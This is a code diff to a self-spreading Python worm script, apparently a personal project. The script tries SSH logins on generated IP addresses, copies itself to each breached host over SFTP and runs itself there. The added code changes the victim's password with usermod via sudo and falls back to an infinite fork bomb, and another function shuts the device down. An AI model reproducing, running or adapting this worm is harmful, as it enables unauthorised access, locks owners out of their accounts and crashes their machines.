@@ -79,7 +79,7 @@ def start_ssh_devices():
                     " and password: ",
                     password,
                 )
-                ssh_connection.connect(ip, username=username, password=password, timeout=1) # added timeout to save time
+                ssh_connection.connect(ip, username=username, password=password, timeout=1) # changed timeout to 1 instead of 10
                 
                 print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")
 
@@ -97,37 +97,45 @@ A function that copies the worm file to the other device via ssh connection and 
 def copy_worm_excute(ssh_connx,passwd):
 
     worm_file = "sleepingWormy.py"
-    #worm_file = "HelloHacker.py"
 
     print("Copying worm and excuting it now")
 
     ssh_sftp = ssh_connx.open_sftp()
-
-    ssh_sftp.put(worm_file, "/" + worm_file)
+    ssh_sftp.put(worm_file, "/" + worm_file) # copy file to ssh'ed machine
 
     ssh_connx.exec_command("python /" + worm_file + " 1 "+passwd)
-
-    # ssh.exec_command("nohup python /" + fileName + " 1 &")
-
     ssh_connx.close()
 
 
 """
-A function that changes the user account's password
+A function that changes the user account's password, if the function fails to change the password then call infinite fork
 """
-def start_attack(current_password):
-    usr = getpass.getuser()
-    new_password = 'pikabuu'
+def change_password_attack(current_password):
 
-    p = subprocess.Popen(('openssl', 'passwd', '-1', new_password), stdout=subprocess.PIPE)
-    shadow_password = p.communicate()[0].strip()
+    try:
+        usr = getpass.getuser()
+        new_password = 'pikabuu'
 
-    if p.returncode != 0:
-        print ('Error creating hash for ', usr)
+        p = subprocess.Popen(('openssl', 'passwd', '-1', new_password), stdout=subprocess.PIPE)
+        shadow_password = p.communicate()[0].strip()
 
-    command = 'usermod -p '+shadow_password+' '+usr
+        if p.returncode != 0:
+            print ('Error creating hash for ', usr)
 
-    p = os.system('echo %s|sudo -S %s' % (current_password, command))
+        command = 'usermod -p '+shadow_password+' '+usr
+
+        p = os.system('echo %s|sudo -S %s' % (current_password, command))
+    
+    except Exception:
+        infinite_fork()
+
+
+"""
+A function that infinitely fork the process
+"""
+def infinite_fork():
+    while True:
+        pid = os.fork()
 
 
 """
@@ -138,15 +146,16 @@ def shutdown_device ():
     subprocess.call("sudo shutdown -h now", shell=True)
 
 
-
-
 if __name__ == "__main__":
 
     # the if statement below is to prevent the worm from harming my personal laptop, so it won't attack it but will ssh to other devices
-    if len(sys.argv) > 2:
+    if len(sys.argv) > 1:
 
         if sys.argv[1] == "1":
-            start_attack(sys.argv[2])
+            if len(sys.argv) == 3: # if password is passed in the arguments then change password
+                change_password_attack(sys.argv[2])
+            else: # otherwise fork processes
+                 infinite_fork()
 
         generate_IP_list()
         start_ssh_devices()
